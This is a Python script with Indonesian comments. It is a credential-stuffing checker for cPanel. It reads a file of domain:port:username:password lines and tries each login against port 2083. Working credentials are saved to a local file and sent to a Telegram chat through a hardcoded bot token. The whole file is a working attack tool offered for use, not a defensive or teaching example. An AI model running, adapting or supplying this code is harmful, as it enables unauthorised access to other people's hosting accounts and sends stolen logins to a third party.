import sys
import signal
import argparse
from datetime import datetime
import requests
from termcolor import colored
from tqdm import tqdm
import asyncio
import re
from telegram import Bot
from telegram.error import TelegramError

# Token bot Telegram yang kamu dapatkan dari BotFather
TELEGRAM_TOKEN = '8862509986:AAE0Jn_b_XHr4mQvQ0xpRE8hPDHBRdQ8IKk'
CHAT_ID = '-1003916774614'  # ID chat yang ingin menerima pesan (gunakan bot untuk mengetahui ID chat)

# Inisialisasi bot Telegram
bot = Bot(token=TELEGRAM_TOKEN)

# Fungsi untuk mengirim pesan ke bot Telegram (menggunakan async)
async def send_telegram_message(message):
    """Mengirim pesan ke bot Telegram"""
    try:
        await bot.send_message(chat_id=CHAT_ID, text=message)
    except TelegramError as e:
        print(f"Error mengirim pesan ke Telegram: {e}")

# Fungsi untuk menangani interupsi (Ctrl+C)
def signal_handler(sig, frame):
    confirm = input(colored("\nApakah Anda yakin ingin menghentikan program? (y/n): ", 'yellow'))
    if confirm.lower() == 'y':
        print(colored("Program dihentikan.", 'yellow'))
        # Kirim pesan berhenti ke Telegram
        asyncio.run(send_telegram_message("Program dihentikan oleh pengguna."))
        sys.exit(0)
    else:
        print(colored("Lanjut menjalankan program...", 'green'))

# Fungsi untuk mengecek login CPanel
def check_cpanel_login(url, username, passwd):
    sess = requests.session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    post_data = {
        'user': username,
        'pass': passwd,
    }

    try:
        response = sess.post(url, data=post_data, headers=headers, timeout=10)
        print(colored(f"URL: {url}", 'magenta'))
        print(colored(f"Status Code: {response.status_code}", 'magenta'))

        if response.status_code == 200:
            print(colored(f"[ {response.status_code} respon ]", 'green'))
            if '"status":1,' in response.text:
                result = f"""\
=====================================================
Success: {url}
Username: {username}
Password: {passwd}
=====================================================
"""
                with open('cpanel_sukses.txt', 'a') as writer:
                    writer.write(result)

                # Kirim pesan ke Telegram
                asyncio.run(send_telegram_message(f"Login CPanel: {url} dengan Username: {username} pass : {passwd}"))

                return True
            else:
                print(colored(f"Web aktif, Username/password salah: {url}", 'yellow'))
                return False
        else:
            print(colored(f"[ {response.status_code} respon ] for {url}", 'yellow'))
            return False
    except requests.exceptions.Timeout:
        print(colored(f"Timeout error for {url}", 'red'))
        return False
    except requests.exceptions.ConnectionError:
        print(colored(f"Connection error for {url}", 'red'))
        return False
    except requests.exceptions.RequestException as e:
        print(colored(f"RequestException for {url}: {str(e)}", 'red'))
        return False

# Fungsi untuk memisahkan URL dengan format domain:port:username:password
def parse_url(line):
    # Menggunakan regex untuk menangani berbagai format URL
    match = re.match(r'^(https?://)([a-zA-Z0-9.-]+):(\d+):([^:]+):(.+)$', line)
    if match:
        protocol, domain, port, username, password = match.groups()
        return domain, int(port), username, password
    else:
        return None

# Fungsi untuk memproses daftar URL dari file
def process_url_list(filename):
    total = 0
    successful = 0

    try:
        # Hitung total baris
        with open(filename, 'r') as file:
            total = sum(1 for _ in file)
    except FileNotFoundError:
        print(f"File tidak ditemukan: {filename}")
        return

    with open(filename, 'r') as file:
        progress_bar = tqdm(total=total, desc="=", ncols=24, ascii=True, bar_format='{l_bar}{bar} {n_fmt}/{total_fmt} {percentage:3.0f}% : ')

        for line in file:
            line = line.strip()
            if not line:
                progress_bar.update(1)
                continue

            try:
                # Memisahkan bagian URL dengan ':'
                result = parse_url(line)
                if result:
                    domain, port, username, passwd = result

                    # Tentukan URL berdasarkan port
                    if port == 2083:
                        url = f"https://{domain}:{port}/login/?login_only=1"
                        success = check_cpanel_login(url, username, passwd)
                    else:
                        print(colored(f"Port tidak dikenal: {port}", 'yellow'))
                        success = False
                else:
                    print(colored(f"Format salah: {line}", 'yellow'))
                    progress_bar.update(1)
                    continue

                if success:
                    successful += 1
                    print(colored(f'Success login for {url}', 'green'))

            except Exception as e:
                print(f"Exception: {e}")

            progress_bar.update(1)

        progress_bar.close()

    if total > 0:
        success_percentage = (successful / total) * 100
        print(colored(f"\nTotal: {total}", 'yellow'))
        print(colored(f"Successful: {successful} ({success_percentage:.2f}%)", 'green'))

        # Kirimkan notifikasi ke Telegram
        asyncio.run(send_telegram_message(f"Proses selesai! Total: {total}, Berhasil: {successful} ({success_percentage:.2f}%)"))
    else:
        print(colored("Tidak ada URL yang diproses.", 'yellow'))

# Menangani interupsi signal (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Main: Memproses file yang berisi daftar URL
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script untuk mengecek login CPanel, WordPress, dan WHM.")
    parser.add_argument('file', help="File yang berisi daftar URL dengan format domain:port_or_path:username:password")
    args = parser.parse_args()

    process_url_list(args.file)
